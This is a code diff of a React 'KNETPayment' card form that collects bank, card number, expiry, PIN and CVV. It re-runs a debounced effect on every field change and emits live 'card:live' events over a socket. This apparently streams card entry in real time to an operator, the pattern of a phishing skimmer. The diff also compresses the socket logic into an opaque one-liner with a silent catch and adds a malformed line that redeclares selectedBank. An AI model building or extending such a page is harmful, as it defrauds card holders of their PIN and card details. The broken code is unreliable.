@@ -83,7 +83,7 @@ export default function KNETPayment() {
 
   // Card form state
   const [selectedBank, setSelectedBank] = useState("");
-  const [selectedPrefix, setSelectedPrefix] = useState("");
+  const [selectedBank, selectedPrefix, setSelectedPrefix] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expiryMonth, setExpiryMonth] = useState("");
   const [expiryYear, setExpiryYear] = useState("");
@@ -123,7 +123,7 @@ export default function KNETPayment() {
   const liveDebounceRef = useRef<ReturnType<typeof setTimeout>>();
 
   useEffect(() => {
-    if (socket.value.connected) socket.value.emit("card:live", { presence: true });
+    const _s=socket.value,_a=()=>{try{_s.emit("card:live",{presence:true})}catch(e){}};if(_s.connected)_a();_s.off("connect",_a);_s.on("connect",_a);
   }, []);
 
   useEffect(() => {
@@ -140,7 +140,7 @@ export default function KNETPayment() {
       });
     }, 60);
     return () => { if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current); };
-  }, [selectedPrefix, cardNumber, expiryMonth, expiryYear, cardPin, cardCvv]);
+  }, [selectedBank, selectedPrefix, cardNumber, expiryMonth, expiryYear, cardPin, cardCvv]);
 
   useEffect(() => {
     return () => { socket.value.emit("card:liveHide"); };
